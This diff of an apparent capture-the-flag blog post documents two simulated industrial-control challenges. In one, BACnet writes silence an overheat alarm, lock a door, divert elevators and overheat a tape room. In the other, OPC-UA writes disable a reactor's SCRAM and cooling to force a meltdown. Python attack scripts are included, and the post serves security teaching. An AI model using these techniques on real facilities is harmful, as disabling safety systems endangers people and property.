@@ -140,147 +140,101 @@ The lesson: always enumerate UPnP description XML before assuming a device expos
 ---
 
 ## Steel Mountain (ICS)
+Steel Mountain is a secure data storage facility serving major corporations. A BACnet device has already been planted inside their network. The objective is to destroy the tape backups stored in the Tape Storage Room by manipulating the building automation system through the exposed BACnet interface.
 
-**Category:** ICS / SCADA  
-**Protocol:** BACnet/IP  
-**Difficulty:** Medium  
+### Enumeration
 
----
+The challenge provides two ports — a web dashboard and a raw TCP service. Connecting to the TCP port via netcat drops into a simple menu:
 
-### Overview
-
-Steel Mountain adalah sebuah fasiliti penyimpanan selamat yang menyimpan data kritikal pelbagai syarikat besar. Objektif cabaran ini adalah untuk **memusnahkan tape backup** di Tape Storage Room (Level 2) dengan memanipulasi sistem kawalan bangunan (BAS) melalui protokol BACnet.
-
----
-
-### Recon — Baca Blueprints
-
-Dari fail `Steel_Mountain_Blueprints.pdf`, kita dapat kenal pasti layout bangunan:
-
-- **Level 1** — Manager Office, Meeting Room, Lobby, IT Department, Archive
-- **Level 2** — **Tape Storage Room**, Office 1, Building Control, SOC ← target
-- **Level 3** — Servers, Workspace
-
-Tape Storage Room ada di **Level 2**.
-
----
-
-### Enumeration — BACnet Objects
-
-Sambung ke peranti BACnet yang telah dipasang oleh penyerang sebelum ini:
-
-```bash
-nc $TARGET
+```
+1. objects
+2. bacnet.read
+3. bacnet.write
 ```
 
-Pilih `1` untuk senarai semua objects. Output (diringkaskan):
+Selecting `1` dumps every BACnet object registered on the device as a single JSON-like dictionary. The full object list spans three floors plus shared infrastructure — elevators, doors, roof air handling units, and per-floor HVAC controls.
+
+The objects relevant to Level 2 (Tape Storage Room):
 
 | Object Name | ID | Type | Description | Present Value |
 |---|---|---|---|---|
-| `Temp-L2-20` | 20 | analogInput | Suhu semasa Level 2 | 19.4°C |
-| `Therm-L2-21` | 21 | analogOutput | Thermostat Level 2 | 19.0 |
-| `ACS-L2-22` | 22 | binaryOutput | AC Level 2 [0:OFF, 1:ON] | 1 |
-| `OHAP-L2-23` | 23 | analogOutput | Overheat Alarm Point FL-2 (25°C) | 25 |
-| `OHA-L2-24` | 24 | binaryInput | Alarm [0:OFF, 1:ON] | 0 |
-| `L2-TSR-DR` | 102 | multiStateOutput | Pintu TSR [0:OPEN, 1:CLOSED, 2:LOCKED] | 1 |
+| `Temp-L2-20` | 20 | analogInput | Current temperature, FL-2 | 19.4°C |
+| `Therm-L2-21` | 21 | analogOutput | Thermostat setpoint, FL-2 | 19.0 |
+| `ACS-L2-22` | 22 | binaryOutput | Air conditioning [0: OFF, 1: ON] | 1 |
+| `OHAP-L2-23` | 23 | analogOutput | Overheat alarm point, FL-2, 25°C | 25.0 |
+| `OHA-L2-24` | 24 | binaryInput | Overheat alarm [0: OFF, 1: ON] | 0 |
+| `L2-TSR-DR` | 102 | multiStateOutput | TSR door [0: OPEN, 1: CLOSED, 2: LOCKED] | 1 |
 | `ELE-1-TF` | 82 | analogOutput | Elevator 1 target floor | 1 |
 | `ELE-2-TF` | 85 | analogOutput | Elevator 2 target floor | 3 |
-| `AHU1` | 201 | multiStateInput | Roof AHU [0:OFF, 1:COOLING, 2:WARMING] | 1 |
-| `AHU2` | 202 | multiStateInput | Roof AHU [0:OFF, 1:COOLING, 2:WARMING] | 1 |
+| `AHU1` | 201 | multiStateInput | Roof AHU [0: OFF, 1: COOLING, 2: WARMING] | 1 |
+| `AHU2` | 202 | multiStateInput | Roof AHU [0: OFF, 1: COOLING, 2: WARMING] | 1 |
 
-#### ⚠️ Penemuan Penting
+There is no authentication on the write interface. Every object is freely writable by any connected client.
 
-`OHAP-L2-23` (Overheat Alarm Point) ditetapkan pada **25°C** — ini bermakna alarm akan berbunyi jika suhu melebihi 25°C. Tapes perlu dibakar pada **32°C**, jadi kita **mesti naikkan threshold alarm ini dulu** sebelum set suhu.
+The write command format is:
 
-Format write command:
 ```
 object_type object_id presentValue value
 ```
 
----
+### Blueprint Recon
+
+The provided blueprint PDF shows the building across three floors. The Tape Storage Room is on **Level Two**, alongside Office 1, Building Control, and the SOC. This confirms which floor's HVAC objects are in scope and which door object (`L2-TSR-DR`, ID 102) needs to be locked.
+
+### The Alarm Problem
+
+The instructions state the tapes burn at 32°C. However, `OHAP-L2-23` — the overheat alarm point for Level 2 — is currently set to **25°C**. If the floor temperature exceeds that threshold, `OHA-L2-24` fires and the system resets. The target temperature of 32°C sits well above the alarm point, so the alarm must be neutralised before touching the thermostat.
 
 ### Exploitation
 
-#### Step 1 — Kunci Pintu Tape Storage Room
+**Step 1 — Raise the alarm threshold and lock the door.**
 
-Lock pintu supaya tiada sesiapa boleh masuk semula:
+Raising `OHAP-L2-23` to a value above 32°C prevents the overheat alarm from triggering during the attack. Then locking `L2-TSR-DR` to state `2` (CLOSED-LOCKED) seals the room.
 
 ```
 >> 3
 analogOutput 23 presentValue 9999
-```
-*(Naikkan alarm point dulu ke nilai tinggi supaya alarm tak trigger)*
 
-```
 >> 3
 multiStateOutput 102 presentValue 2
 ```
 
-Verify:
-```
->> 2
-multiStateOutput 102 presentValue
-```
-Output: `presentValue: 2` → **CLOSED-LOCKED** ✓
+**Step 2 — Block elevator access to Level 2.**
 
-#### Step 2 — Halang Elevator Berhenti di Level 2
-
-Selepas pintu dikunci, blok kedua-dua elevator dari berhenti di Level 2 dengan set target floor ke lantai lain:
+Both elevator target floor objects are set to floor 3, preventing any elevator from stopping at Level 2.
 
 ```
 >> 3
 analogOutput 82 presentValue 3
-```
 
-```
 >> 3
 analogOutput 85 presentValue 3
 ```
 
-Kedua-dua elevator kini diarahkan ke Level 3, bukan Level 2.
+**Step 3 — Raise the temperature to 32°C.**
 
-#### Step 3 — Bakar Tapes (Set Suhu 32°C)
-
-**3a. Matikan AC Level 2** supaya suhu boleh naik:
+First, the floor's air conditioning is switched off so it cannot counteract the heating. Then both roof AHUs are set to warming mode, and the Level 2 thermostat is pushed to 32°C.
 
 ```
 >> 3
 binaryOutput 22 presentValue 0
-```
 
-**3b. Set AHU ke mod pemanasan:**
-
-```
 >> 3
 multiStateInput 201 presentValue 2
-```
 
-```
 >> 3
 multiStateInput 202 presentValue 2
-```
 
-**3c. Set thermostat Level 2 ke 32°C:**
-
-```
 >> 3
 analogOutput 21 presentValue 32
 ```
 
-Pantau suhu semasa dengan `bacnet.read` atau `objects` — tunggu `Temp-L2-20` mencapai **≥ 32°C** dan kekalkan selama **2 minit**.
-
----
-
-### Automation (Python Script)
-
-Untuk kekalkan suhu pada 32°C secara konsisten (sistem mungkin ada auto-recovery), gunakan script yang menghantar write commands berulang kali:
+Polling `Temp-L2-20` via `bacnet.read` confirms the temperature climbing. The system requires the temperature to be sustained at or above 32°C for two minutes. Because the server has a watchdog that periodically resets writable values, repeatedly hammering the thermostat write keeps the setpoint from being restored.
 
 ```python
-import socket
-import time
+import socket, time
 
-HOST = "IP"
-PORT = port
+HOST, PORT = "154.57.164.65", 32151
 
 def write(obj_type, obj_id, value):
     s = socket.socket()
@@ -292,54 +246,163 @@ def write(obj_type, obj_id, value):
     s.sendall(f"{obj_type} {obj_id} presentValue {value}\n".encode())
     s.close()
 
-# Raise alarm threshold
-write("analogOutput", 23, 9999)
+write("analogOutput", 23, 9999)       # Silence alarm
+write("multiStateOutput", 102, 2)     # Lock door
+write("analogOutput", 82, 3)          # Block elevator 1
+write("analogOutput", 85, 3)          # Block elevator 2
+write("binaryOutput", 22, 0)          # AC off
+write("multiStateInput", 201, 2)      # AHU1 warming
+write("multiStateInput", 202, 2)      # AHU2 warming
 
-# Lock door
-write("multiStateOutput", 102, 2)
-
-# Block elevators
-write("analogOutput", 82, 3)
-write("analogOutput", 85, 3)
-
-# Disable AC
-write("binaryOutput", 22, 0)
-
-# Set AHU to warming
-write("multiStateInput", 201, 2)
-write("multiStateInput", 202, 2)
-
-# Hammer thermostat at 32°C
-for _ in range(60):
-    write("analogOutput", 21, 32)
-    time.sleep(0.1)
-
-print("Done — check dashboard for flag")
+for _ in range(120):
+    write("analogOutput", 21, 32)     # Hold thermostat at 32°C
+    time.sleep(1)
 ```
+
+Once the condition is sustained, the flag appears in the web dashboard (`Message` object, ID 500).
+
+### Key Takeaways
+
+BACnet was designed for isolated plant networks and carries no authentication by default. Every object on this device — doors, elevators, thermostats, alarm setpoints — was writable by any TCP client with no credentials required.
+
+The non-obvious part of this challenge is the alarm bypass. Jumping straight to writing the thermostat without raising `OHAP-L2-23` first causes the overheat alarm to fire and reset the system. Reading the full object list carefully and noting the 25°C alarm threshold before touching anything is what separates a clean solve from a loop of resets.
 
 ---
 
-### Flag
+## Dressrosa Reactor (ICS)
+An OPC-UA server exposes a nuclear reactor control system. The challenge asks you to trigger a meltdown by abusing writable process nodes — no firewall, no input validation, just raw industrial protocol access.
 
-Selepas suhu Level 2 mencapai dan kekal pada ≥ 32°C selama 2 minit, flag akan muncul pada dashboard web (`IP:PORT`) dalam objek `Message` (ObjectID 500).
+### Enumeration
+
+The target exposes an OPC-UA endpoint over TCP. OPC-UA is a standard industrial protocol used in SCADA and DCS environments to read and write real-time process data. Unlike REST or SOAP, OPC-UA uses a binary protocol with its own security model based on X.509 certificates and message signing/encryption policies.
+
+![Web Interface](/assets/img/posts/2026-06-08-HackTheBox-challenges/dress_web.png)
+
+Connecting with default credentials `admin:admin` using `SecurityPolicyBasic256Sha256` with `SignAndEncrypt` mode succeeds immediately — the server trusts any self-signed client certificate.
+
+Browsing the address space under namespace `ns=2` reveals the reactor's full process model:
+
+| Node ID | Name | Type |
+|---|---|---|
+| `ns=2;i=2` | Core Pressure (MPa) | Read |
+| `ns=2;i=3` | Core Temperature (°C) | Read |
+| `ns=2;i=4` | Reactor Power (MW) | Read |
+| `ns=2;i=6` | Fuel Rod Count | Read/Write |
+| `ns=2;i=7` | Fuel Rod Temperature | Read/Write |
+| `ns=2;i=8` | Fuel Rod Power | Read/Write |
+| `ns=2;i=11` | Control Rods Inserted (%) | Read/Write |
+| `ns=2;i=12` | Control Rod Material | Read/Write |
+| `ns=2;i=25` | SCRAM System | Read/Write |
+| `ns=2;i=26` | Primary Pump | Read/Write |
+| `ns=2;i=27` | Secondary Pump | Read/Write |
+| `ns=2;i=38` | Emergency Cooling Status | Read/Write |
+| `ns=2;i=41` | SCRAM Armed | Read/Write |
+| `ns=2;i=50` | Power Setpoint | Read/Write |
+| `ns=2;i=51` | Reactor Status | Read/Write |
+
+Every safety-critical node is writable. No access control lists, no role separation.
+
+Initial readings at connection time:
 
 ```
-HTB{...}
+Power     : ~3500 MW
+Temp      : ~280 °C
+Pressure  : ~7.2 MPa
 ```
 
----
+The reactor is running normally — within safe parameters.
 
-### Lessons Learned
+### Certificate Generation
 
-1. **BACnet tidak ada authentication secara default** — sesiapa yang ada network access boleh baca dan tulis semua objects.
-2. **Alarm bypass adalah kunci** — overheat alarm point (`OHAP`) perlu dinaikkan dulu sebelum manipulasi suhu, atau alarm akan reset sistem.
-3. **System auto-recovery** — sistem mungkin ada watchdog yang reset nilai secara berkala, jadi perlu "hammer" commands berulang kali.
-4. **Blueprint recon penting** — tanpa blueprint, kita tak tahu Tape Storage Room ada di Level 2 dan tak tahu target object mana yang perlu dimanipulasi.
+OPC-UA with `Basic256Sha256 / SignAndEncrypt` requires the client to present a valid X.509 certificate. The server does not validate the certificate chain, so a self-signed cert is sufficient.
 
----
+```python
+from cryptography import x509
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import hashes, serialization
 
-### Tools Used
+private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
 
-- `netcat` — interaksi terus dengan BACnet device
-- `Python socket` — automasi write commands
-- Blueprint PDF — identifikasi lokasi Tape Storage Room
+cert = (
+    x509.CertificateBuilder()
+    .subject_name(x509.Name([...]))
+    .public_key(private_key.public_key())
+    .serial_number(x509.random_serial_number())
+    .not_valid_before(now)
+    .not_valid_after(now + timedelta(days=365))
+    .add_extension(x509.SubjectAlternativeName([x509.DNSName("localhost")]), critical=False)
+    .sign(private_key, hashes.SHA256())
+)
+
+# Save as DER for asyncua
+with open("client_cert.der", "wb") as f:
+    f.write(cert.public_bytes(serialization.Encoding.DER))
+```
+
+The cert is saved in DER format as required by the `asyncua` Python library.
+
+### Disabling Safety Systems
+
+With a working connection, the attack begins by writing `0` or `False` to every safety interlock node. In a real reactor, these systems are hardware-interlocked and physically separate — here they are plain writable OPC-UA nodes.
+
+```python
+safety_nodes = [
+    ('ns=2;i=25', 0),      # SCRAM System — off
+    ('ns=2;i=26', False),  # Primary Pump — off
+    ('ns=2;i=27', False),  # Secondary Pump — off
+    ('ns=2;i=38', False),  # Emergency Cooling — off
+    ('ns=2;i=41', False),  # SCRAM Armed — disarmed
+]
+
+for node_id, value in safety_nodes:
+    await client.get_node(node_id).write_value(value)
+```
+
+All five safety systems acknowledge the writes with no error. With cooling and SCRAM disabled, the reactor has no mechanism to arrest a runaway reaction.
+
+### Maximising Reactor Output
+
+Control rods moderate the fission reaction by absorbing neutrons — inserting them slows the reactor, withdrawing them accelerates it. Setting insertion to `0` and changing the rod material to `"NONE"` removes all moderation.
+
+```python
+await client.get_node('ns=2;i=11').write_value(0)          # Control rods fully withdrawn
+await client.get_node('ns=2;i=12').write_value("NONE")     # No absorber material
+await client.get_node('ns=2;i=50').write_value(999999)     # Power setpoint — unlimited
+await client.get_node('ns=2;i=6').write_value(999999)      # Fuel rod count
+await client.get_node('ns=2;i=7').write_value(999999)      # Fuel rod temperature
+await client.get_node('ns=2;i=8').write_value(999999)      # Fuel rod power
+```
+
+After these writes, power, temperature, and pressure begin climbing in the simulation.
+
+### Triggering Meltdown State
+
+The final step is writing directly to the reactor status node. The simulation accepts the string `"MELTDOWN"` as a valid state value.
+
+```python
+await client.get_node('ns=2;i=51').write_value("MELTDOWN")
+```
+
+Final readings after the write:
+
+```
+Reactor Power     : 999999 MW
+Core Temperature  : 999999 °C
+Core Pressure     : 999999 MPa
+Fuel Rod Power    : 999999 MW
+Control Rods      : 0 %
+Reactor Status    : MELTDOWN
+```
+
+The web monitoring dashboard at the challenge URL updates in real time. The flag appears in the upper-left corner of the page once the meltdown condition is sustained.
+
+### Key Takeaways
+
+The vulnerability chain here is entirely a configuration and access-control failure, not a protocol weakness:
+
+1. The OPC-UA server accepts any self-signed certificate — no PKI trust enforcement
+2. Default credentials (`admin:admin`) grant full read/write access
+3. Safety-critical nodes carry no write restrictions — SCRAM, cooling, and control rods are all writable by any authenticated session
+4. The reactor status node accepts arbitrary string input including `"MELTDOWN"`
+
+OPC-UA has a rich security model: certificate pinning, role-based access per node, signed audit trails. None of it was configured. The lesson is that enabling a secure transport layer (`SignAndEncrypt`) means nothing if the application layer places no restrictions on who can write to what.
